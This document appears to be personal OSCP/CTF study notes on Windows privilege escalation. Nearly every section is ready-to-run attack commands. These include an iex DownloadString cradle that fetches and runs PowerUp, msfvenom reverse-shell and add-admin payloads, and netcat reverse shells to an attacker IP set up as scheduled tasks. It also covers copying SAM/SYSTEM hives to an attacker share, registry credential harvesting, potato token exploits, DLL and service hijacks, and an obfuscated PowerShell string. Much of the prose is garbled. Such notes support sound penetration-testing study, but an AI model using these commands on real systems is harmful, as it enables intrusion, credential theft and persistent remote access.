# Windows PrivilegeEscalation

Privilege Escalation commonly without binary exploitation focuses on misconfigurations surrounding Windows Permissions. Defaults, design that makes it more difficult to be safe and "best"  practice that in actuality not are the systemic issue in the root blame for insecure machines. Third party software can be grant permissions alter the file system, but either make it then insecure or not implement reconfiguration to amend file system permissions. Sysadmin can implement managing that is not actuall secure or practice management that makes it more difficult to expose insecurities. SysAdmin like GUI the don't see actual special permission because does not show which permisions, so use the command line - it many clicks deep in a window or GUI does not display actualities.

Considerations

- Know how it should be configured, Script and Tools should be narrowing down tool not a exploit button
- `netsh` is very powerful and widing used by Devs!
- Never forget sysinterals - it wont be treated as malware, but Opsec still applies!
- Find insecure registery key - perform subkey inherence check

Replacing anything considerations:
- With `.msi`, install shield copies your permissions!
- Create proxy dlls, before sideloading dlls - the process crash bescause your msfven9m shell does not have the functionality to maintain process. if you must sideload. use non callback, just add a user.
- `program.exe` for 0day naming by Jake Williams. Game-on tip is to create a program.exe on your box thats a just application that can alert you that unquoted path vulnerabiltiy exists in some third party software equals disclosure 0day.
- Replacing a  `.exe` fails - Windows locks "open exclusive" exes at runtime, Windows does not page executables to pagefile, the copy is on disk why both. Also any autostart cannot be replaced
- Modify service conf, usually not conf, but the scripting
- Registry key modifcations allow replacement of imagepath - sc does not read Registry key as runtime only at boot...so you have to reboot

DLL search order

Unsafe | Safer
--- | ---
Current Directory | Directory Applicqtion is loaded 
Directory Applicqtion is loaded | System32
System32 | 16 bit system file: Windows\System 
16 system file: Windows\System | C:\Windows
C:\Windows | Current Directory
%PATH% | %PATH%

AppLocker Bypass
By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
  [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)[https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
  [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
  

For Manual Enumeration see [[Windows-Privilege-Escalation-Enumeration]]
For [[Windows-File-Transfers]]
For [[WMI-Commands]]
For [[Windows-CLI-cmd]]
For [[PrivEsc-Important-Windows-Locations]]
For [[Powershell-versions]]
Check out [[Kali-Windows-Resources]] for selection of binaries and such to transfer!


For Powershell Bypassing see [[Windows-Privilege-Escalation Bypassing-Contrained-Powershell]]
For ASMI bypassing [[ASMI-Bypassing]]

Scripts and tools
```powershell
https://github.com/carlospolop/PEASS-ng # Is OSCP compliant as of 2022
https://github.com/Tib3rius/windowsprivchecker
https://github.com/gladiatx0r/Powerless.git # For OSCP & Legacy Windows System
https://github.com/411Hall/JAWS	# jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
https://github.com/bitsadmin/nopowershell  
https://github.com/rasta-mouse/AmsiScanBufferBypass  
https://github.com/cobbr/InsecurePowerShell  
https://github.com/BC-SECURITY/Starkiller  
https://github.com/besimorhino/powercat
```
[subinacl](https://windows-resource-kit-tools-subinacl-exe.software.informer.com/) *"enables administrators to obtain security information about files, registry keys, and services, and transfer this information from user to user, from local or global group to group, and from domain to domain."* - Stealthy and reliable.
Sysinternals will always be your friend - [[Sysinternals-Hub]] or [Download here](https://docs.microsoft.com/en-us/sysinternals/downloads/)
[[Impacket-Cheatsheet]]
[[Seatbelt-Helpsheet]]

[Empire](https://github.com/BC-SECURITY/Empire) is C2 covered here: [[Empire]] and [[Starkiller]]
For [wesng](https://github.com/bitsadmin/wesng) check usage for [[WESNG-Helpsheet]]
[Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection) is a github repos that contains ..*"
Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines."* 
The below will load the PowerUp script into memory of a pwoershell shell, then use [[PowerSploit-PowerUp-Helpsheet]], from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
powershell.exe -ExecutionPolicy Bypass -File .\
```

## Alway Check Arch before making shells!
Careful of x64,x32,x86_64 etc funtimes with windows!

[[MSFvenom-Payloads]]
Extension for AlwaysInstallElevated == msi
Extension for Dynamic-Linked-Libraries == dll //not done a reverse shell from a dll but maybe possible..

# Escalation Vectors


## Insecure Directory permissions

**THIS IS FREQUENT CHAINING OF INSECURITIES - OWNSHIP AND INTERACTABILITY IS CRITICAL TO EVERYTHING ICACLS IS YOU BEST FRIEND**
You are looking for with  `icacls` either a directory or tree of directories due to Windows Pathing for locating executables:
- Write/Add file
- Delete permission + search path or anywhere else on search path. 

## Whoami /priv & SePrivileges
[Whoami Priv2Admin Definitive List](https://github.com/gtworek/Priv2Admin)
[Whoami /priv SeImpersonate Privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

From the `whoami /priv` privileges can be displayed.

- **SeBackUp / SeRestore**
SeBackup and SeRestore privileges allow users to read and write to any file in the system, bypass DACL. PrivEsc be backuping SAM and SYSTEM hives
```batch
reg save hklm\system C:\path\to\exfil\out\from
reg save hklm\sam C:\path\to\exfil\out\from
```
Use [[Impacket-Cheatsheet]], smbshare  to `copy` or `xcopy`  or `move` the hives your smb share. Then perform a [[Pass-The-Hash]] with Adminstrators hash.

- **SeTakeOwnership**
SeTakeOwnship allows file ownership transference to then `icacls` to grant full permissions over that file, replace with cmd.exe to PrivEsc:
```batch
takeown /f C:\path\to\an.exe
icalcs C:\path\to\an.exe /grant <CurrentUser>:f
copy C:\path\to\cmd.exe C:\path\to\an.exe
```
- **SeImpersonate / SeAssignPrimaryToken**
SeImpersonate and SeAssignPrimaryToken abuse consists of ability to spawn a process or thread under a different user's security context. 

#### Rogue Potato - Token Impersonation
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
C:\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999 # in local service reverse shell run exploit
``` 

#### PrintSpoofer - Token Impersonation
```
C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # triggered on ADMIN use
C:\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i # in local service reverse shell run exploit
```
[PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases)

## Credentials
In files, memory or [[Windows-Registry]]
```powershell
findstr /si password *.xml *.ini *.txt *.config
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# WDigest if active store plain-text passwords are stored in LSASS
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential 
# Windows > 8.1 LSA protection for the LSA to prevent untrusted processes from being able to read its memory or to inject code
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
# Windows 10 Credential Guard
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
# Cached Domain Credentials
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Volume Shadow Copy Service
If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.
```powershell
# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
# List shadow copies using diskshadow
diskshadow list shadows all
  
# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

## SPN map
```powershell
setspn -T medin -Q  */*        # extract all accounts in the SPN (service principle name) service and account mapping, may contain passwords..
```

## Services
See [[Windows-Services]] and [[Windows-System-And-Service-Privileges]]
```powershell
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
# Look for \Program Files\* as they are User installed and DEv is charge directory structure and persmissions of Software.
```
Check here for detailed [[Windows-Permissions]] descriptions. 
```powershell
icacls *.exe
```
Replace executable with malicious binary, stop the original, get start options.
```powershell
# compile PrivEsc code C,C++ and C# are probably best choices
move "*.exe" "original.exe.bkp" # backup
move exploit.exe "\*exe's\path"
net stop Vulnerable_Service
wmic service where caption="Vulnerable_Service" get name, caption, state, startmode
# Check the start mode and adjust accordingly
```


## Insecure Service permissions
```powershell
accesschk.exe /accepteula -uwcqv <user> <service> # sysinternals
sc qc <service>
sc config <service> binpath= "pathtoreverseshell.exe" obj= LocalSystem
net start <service>
# Or
sc stop <service>
sc start <service>
```
With powershell use:
```powershell
sc.exe # sc is Set-Content!
```
Use the correct format with msfvenom `-f exe-service`.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4445 -f exe-service -o rev-svc.exe
```

## Unquoted Service Path
Attack then levages the algorithm that search for mapped relevant services additional alternate interpretable locations and between non-explicitly declared file paths with whitespace. Unquoted service path are forgotten because developers forget extra `"`s that dont end up in the registry.  If unquoted the path is then parsed as if the path ends in an executable accepting arguments.
Requires: 
1. Write permissions to a `service`'s main directory tree, but cannot replace files within the tree. 
2. The path to the service must contain `whitespace` character like third party software directory `\Program Files\Insert Your Software\Service Location\here.exe`; 

Developers must ensure the that paths containing spaces are enclosed in quotation marks otherwise the path is interpretered by the search algorithm. Enumerate either with:
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
```
[[Meterpreter-Commands]]
```msfconsole
use exploit/windows/local/trusted_service_path
```
[[PowerSploit-PowerUp-Helpsheet]]
```powershell
sc qc <unquotedsvc> # Query a service that has BINARY_PATH_NAME that is UNQUOTED AND CONTAINS SPACES
icacls <.exe>
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" # sysinternals
```

```bash
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4444 -f exe-service -o svc-exe.exe
```

```batch
# File transfer
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start unquotedsvc
# or
sc stop unquotedsvc
sc start unquotedsvc
```
[Pentestlab](https://pentestlab.blog/2017/03/09/unquoted-service-path/)

`program.exe` for 0day naming by Jake Williams. Game-on tip is to create a program.exe on your box thats a just application that can alert you that unquoted path vulnerabiltiy exists in some third party software equals disclosure 0day. 

## Insecure service executables

If service's executable DACL is well configured and service binary path is correctly quoted - should DACL allow modification of the configuration of a service then reconfigure it!

```batch
sc qc filepermsvc # Find a service that runs with SYSTEM privileges
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe" # sysinternals - check writability
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y # replace the filepermservice.exe
# (Re)start service
net start filepermsvc 
# or 
sc stop filepermsvc
sc start filepermsvc
```

## IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. `web.config` store the configurations found either:
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
It can contain passwords.
```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```


## Unattended Windows Installations
Credentials maybe found in this xml files if batch installation on large number of hosts has not been cleaned up by a SysAdmin
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```


## Autorun executables
```powershell
# WARNING
# BEWARE
# FOR this to work you would have to restart a box
# OSCP exam or CTFs probably want you to turn off the *sigh* box  
#
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe" # sysinternals - check writablity
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y # copy reverse shell and overwrite the autorun
# restart system
```

## AlwaysInstalledElevated
Jake Williams:  `AlwaysInstalledElevated` check if its an `.msi`, commonly found in 500-5000 employee size companies, not enterprises.
```powershell
# Some PrivEsc related material online does not include the /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # Query Both
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # If both keys are set 1 (0x1)
```
On attackbox:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKBOX LPORT=$PORT -f msi -o reverse.msi # Beware of Arch
# Also requires metasploit handler module configured accordingly 
msiexec /quiet /qn /i C:\Windows\Temp\reverse.msi 
```

## Backup SAM and SYSTEM files
```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\ # These can often be transfered and cracked
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

## Passwords in the registry
```
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" # For admin autologons!
winexe -U 'admin%password' //MACHINE_IP cmd.exe # Kali winexe
```
PuTTy is an SSH client commonly found on Windows systems users can store session to retrieve the store d proxy credentials from proxcy configurations that are in plaintext 
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s
```

## Weak Registry Permissions

Register keys have permissions, but register values do not have permissions. Values are inheirated from keys, subkeys if value or key has control of execution of a privileged process has write permissions we run code with elevated permissions. Always perform subkey inherence check.

Register keys have Plugin dlls. Point to dll and bam, but msfvenom is not your friend
[subinacl](https://windows-resource-kit-tools-subinacl-exe.software.informer.com/) permission of reg key as Powershell `get-acl` has bitmask conversion - high number means special permissions but unweildy output.
```
sc qc regsvc # Find weak registry permission, a service that runs with SYSTEM privileges
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc # sysinternals
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f 
net start regsvc
```

## Finding services with modifiable registry values
```powershell
sc qc # query service configuration
```
Importantly the `BINARY_PATH_NAME` parameter is executed by `SERVICE_START_NAME`.
All service configurations are `HKLM\SYSTEM\CurrentControlSet\Services\`

```powershell
# accesschk is sysinternals
# use icalcs
icacls C:\vulnerable\service.exe
# IF group permissions allow for modify permission (M) on a the service executable -> overwrite it with a payload of choice.
accesschk.exe -kvqwsu "Authenticated Users" hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvqwsu "Users" hklm\system\currentcontrolset\services /accepteula
accesschk.exe -kvqwsu "Everyone" hklm\system\currentcontrolset\services /accepteula
```

## Binary Path
```powershell
reg query "HKLM\System\CurrentControlSet\Session Management\Environment"
%PATH% # if writable by authenticated users
# prepended paths are bad
reg32
netsh # devs use it alot it can tcpdump,but wih processes

accesschk64.exe -wuvc daclsvc # sysinternals - if user has SERVICE_CHANGE_CONFIG permission
sc config daclsvc binpath="net localgroup administrators [username] /add"
sc start daclsvc
net localgroup administrators
```

## Service Escalation Registry
Use [subinacl](https://windows-resource-kit-tools-subinacl-exe.software.informer.com/) 
```powershell
reg query 
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl # Avoid powershell
Copy ‘C:\service.c # Edit file, either on box or on attack box, depending on local compiler and noise:
# replace or add a system() function call to:
"cmd.exe /k net localgroup adminstrators [username] /add"
# x86_64-w64-mingw32-gcc windows_service.c -o x.exe
# Copy back to /Temp
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f # Edit path
sc start regsvc
netlocalgroup administrators # check success
```

## Saved Credentials:
```powershell
cmdkey /list                                    list saved credentials
runas /savecred /user:admin reverse_shell.exe   query /savedcred
vaultcmd /list
# Web credentials, Windows credentials, Generic credentials. Certificate-based credentials
vaultcmd /listproperties:"$category" 
# Will display the number, location in AppData and protection method
vaultcmd /listcreds:"$category" # information about stored credentials
```

Autologon Credentials
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon 
```

## Password Mining Configuration Files
```
# Look for Unattend.xml used by sysadmins to setup systems, should be deleted.
# Finding unquoted service path vulnerabilities
wmic service get name,displayname,pathname,startmode | Sort
#NEED A powershell command to find the unquoted path pipe
sc qc [service]        #  to query binary path service
```

## Passwords in Unattended.xml
```
C:\Windows\Panther\Unattend\Unattended.xml
```

## Password Mining Memory
```bash
# Attack box
msfconsole:
use auxiliary/server/capture/http_basic
set uripath x
run
```
Then on target
```powershell
# browser -> http://attackbox_address/x
# open cmd
taskmgr
# right-click iexplorer.exe of "Image Name" column
# select "Create Dump File"
# Copy file to attack box
# On attack box
strings dump.DMP | grep "Authorization: Basic"
echo -ne base64string | base64 -d
```

## Passing the hash
```powershell
pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe # Full hashes delimitereed by colon.

# Alternative:

responder.py #TODO!!
```

## Scheduled Tasks
```powershell
schtasks /query /tn $task_name /fo list /v
```
`Task to Run` parameter indicates what gets executed  
`Run as User` parameter indicates who executes task  
Use `icalcs` to check file permissions on the executable:
```powershell
icacls c:\path\to\task\to\run.extension
```
Replace with compatible version of netcat, socat, msfvenom reverse shell, etc
```powershell
echo c:\path\to\connection\method\nc64.exe -e cmd.exe $ATTACKER_IP 4444 > c:\path\to\task\to\run.extension
```
Then force task to run, remember to setup whatever listener required:
```powershell
schtasks /run /tn $task_name
```

Make a scheduled task, that runs nc.exe, if lacking privileges give shell those upon new schedule task shell for another shell...
```powershell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe $ip 4444 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
# Catch reverse shell
# We may lack some privileges
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
# Catch another shell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe $ip 4444 -e cmd.exe`""
# Register SchedueledTask
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
# Start Task
Start-ScheduledTask -TaskName "GrantAllPerms"
```

## Scheduled Tasks with Sysinternals
```powershell
\accesschk.exe /accepteula -quvw user C:\ScheduleTask.ps1 # systernals - if running it can be run somehow as SYSTEM
# If writable:
echo reverseShell.exe >> C:\ScheduleTask.ps1 # append .exe
```

## Insecure GUI Apps
```
tasklist /V # GUI apps that can be run as Admin 
# In file dialogue box 
file://c:/windows/system32/cmd.exe
```

## Startup Applications 
```
# BEWARE YOU NEED TO RESTART/LOGOFF! Requires trigger!
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" # sysinternals
# Create a shortcut to your reverse shell in StartUp directory.
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# place reverse shell in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

## DLL hijacking!
```
# Find a dll to exploit
# Get the windows_dll.c
# Edit, replacing the system() call to:
cmd.exe /k net localgroup administrators user /add
#compile
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
# place the dll
sc stop dllsvc 
sc start dllsvc # Or start a service that use it.
```

## WSUS
If updates are run via http, not https:
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
# If you get:
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
	WUServer REG_SZ http:// # Some http server! 
# AND
HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer # == 1 
```
Use: [wsuxploit](https://github.com/pimps/wsuxploit) or [pywsus](https://github.com/GoSecure/pywsus)


## Powershell downgrade
```powershell
powershell -version 2
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```


## UAC bypass
Check out [[Bypassing-Windows-User-Account-Control]] for more!
```powershell
# If Windows 10 build 1709, Microsoft's fodhelper.exe
# Admin user can silently bypass
# Settings -> Apps & features ->  Manage optional features
fodhelper.exe # by default runs on High Integrity 
# Sysinternals sigcheck to inspec manifest
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

## Kernel exploits
Enumerate the [[Windows-Kernel]]
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
driverquery /v
```
Research potential exploit...

[[Metasploit]] modules:
```bash
msfconsole -> use multi/handler -> set payload - >set lhost -> run
# msfvenom your tailoured shell for targeting architecture professionalism
# copy shell to Windows box and run it
# On attack box
run post/multi/recon/local_exploit_suggester
# For example 
# identify exploit/windows/local/ms16_014_wmi_recv_notif
set session [sessionnumber]
set lport [portnumber]
run
```

## Hot Potato
```powershell
powershell.exe -nop -ep bypass
https://github.com/Kevin-Robertson/Tater.git
Import-Module C:\Path\To\HotPotato.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

## Partial Uninstalled Software
Jake Williams *"COM objects are the devil"*, they are controlled registery values specifically InProcServer32 value. Stale COM objects remain and current service executables will try invoke COM objects with specific class ids. With bad file permissions we can escalate privileges. [Casey Smith @Subtee/BoHop Talk](https://www.youtube.com/watch?v=3gz1QmiMhss) and [Writeup of Talk by enigma0x3](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)*"Some environments use whitelisting to prevent unsigned Windows Scripting Host (WSH) files from running, especially with the rise of malicious .js or .vbs files. However, by “injecting” our malicious code into a Microsoft signed WSH script, we can bypass such a restriction."*. It super stealthy persistence as no one checks at your COM objects. 

Upcoming


## AppLocker Bypassing

By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users:
- [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
- https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
- [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)


## References

[THM Windows PrivEsc Room](https://tryhackme.com/room/windowsprivesc20)
[THM Lay of the Land Room](https://tryhackme.com/room/thelayoftheland)
[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
[PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
[Wild west hackin' Fest Jake Williams - Talk: Elevating your Windows Privilege like Boss](https://www.youtube.com/watch?v=SHdM197sbIE')
[Wild west hackin' Fest Jake Williams - Talk: Privilege Escalation](https://www.youtube.com/watch?v=yXe4X-AIbps)
[Udemy - tib3rius](https://www.udemy.com/user/tib3rius/)
[Casey Smith @Subtee/BoHop Talk](https://www.youtube.com/watch?v=3gz1QmiMhss) 
[Writeup of Talk by enigma0x3](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)
[Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
[RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
[Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
[Decoder's Blog](https://decoder.cloud/)
[Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
[Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
